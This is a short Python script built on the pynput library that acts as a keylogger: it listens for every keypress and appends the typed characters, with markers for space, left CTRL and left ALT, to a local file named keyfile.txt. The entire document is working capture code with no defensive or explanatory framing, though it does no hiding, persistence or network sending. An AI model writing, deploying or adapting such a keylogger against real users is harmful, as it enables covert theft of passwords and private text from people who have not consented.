from pynput import keyboard



def keypressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:

            if key == keyboard.Key.space:
                logkey.write(" ")
            elif key== keyboard.Key.ctrl_l:
                logkey.write(" [CTRL]")
            elif key== keyboard.Key.alt_l:
                logkey.write(" [ALT]")

            else:
                char = key.char
                logkey.write(char)
        except:
            print("Error Getting Char")
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()